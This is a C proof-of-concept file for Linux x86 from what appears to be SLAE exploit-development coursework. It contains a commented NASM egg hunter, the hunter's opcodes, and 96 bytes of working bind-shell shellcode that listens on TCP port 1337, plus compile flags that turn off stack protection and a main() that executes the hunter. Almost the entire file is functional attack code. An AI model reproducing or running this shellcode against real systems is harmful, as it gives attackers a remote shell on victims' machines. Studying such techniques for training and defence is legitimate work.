/*
 * Title: Egg Hunter PoC
 * Platform: linux/x86
 * Date: 2015-01-07
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
 */

/*
 * egg_hunter.nasm
 * ---------------
 *  BITS 32
 *
 *  global _start
 *  section .text
 *
 *  EGG_SIG equ 0x4f904790   ; signature
 *
 *  _start:
 *  	cdq                  ; zero out edx
 *  	mov edx, EGG_SIG     ; edx = 0x4f904790
 *
 *  search_the_egg:
 *  	inc eax              ; increment eax
 *  	cmp DWORD [eax], edx ; compare eax with the EGG_SIG
 *  	jne search_the_egg   ; if not compare jump to search_the_egg
 *
 *  	jmp eax              ; jump to eax
 *
 */
#include <stdio.h>
#include <string.h>

/*
 * Egg Signature:
 *
 *   0x4f    0x90    0x47    0x90
 *    |       |       |       |
 * dec edi - NOP - inc edi - NOP
 */
#define EGG_SIG "\x90\x47\x90\x4f"

unsigned char egg_hunter[] = \
	"\x99"                   /* cdq */
	"\xba\x90\x47\x90\x4f"   /* mov edx, 0x4f904790 */
	"\x40"                   /* inc eax */
	"\x39\x10"               /* cmp DWORD PTR [eax], edx */
	"\x75\xfb"               /* jne 6 <search_the_egg> */
	"\xff\xe0";              /* jmp eax */

/*
 * Bind Shell TCP shellcode - 96 byte
 * bind to port: 1337
 */
unsigned char shellcode[] = \
	EGG_SIG        /* Egg Signature */
	"\x6a\x66\x58\x6a\x01\x5b\x31\xf6"
	"\x56\x6a\x01\x6a\x02\x89\xe1\xcd"
	"\x80\x5f\x97\x93\xb0\x66\x56\x66"
	"\x68\x05\x39\x66\x6a\x02\x89\xe1"
	"\x6a\x10\x51\x57\x89\xe1\xcd\x80"
	"\xb0\x66\xb3\x04\x56\x57\x89\xe1"
	"\xcd\x80\xb0\x66\xb3\x05\x56\x56"
	"\x57\x89\xe1\xcd\x80\x93\x31\xc9"
	"\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
	"\x75\xf8\x6a\x0b\x58\x31\xc9\x51"
	"\x68\x2f\x2f\x73\x68\x68\x2f\x62"
	"\x69\x6e\x89\xe3\x89\xca\xcd\x80";

/*
 * $ gcc -Wl,-z,execstack -fno-stack-protector PoC.c -o PoC
 *  [+] Egg Hunter Length:  13
 *  [+] Shellcode Length + 4 byte egg:  100
 *
 */
void main()
{
	printf("[+] Egg Hunter Length:  %d\n", strlen(egg_hunter));
	printf("[+] Shellcode Length + 4 byte egg:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}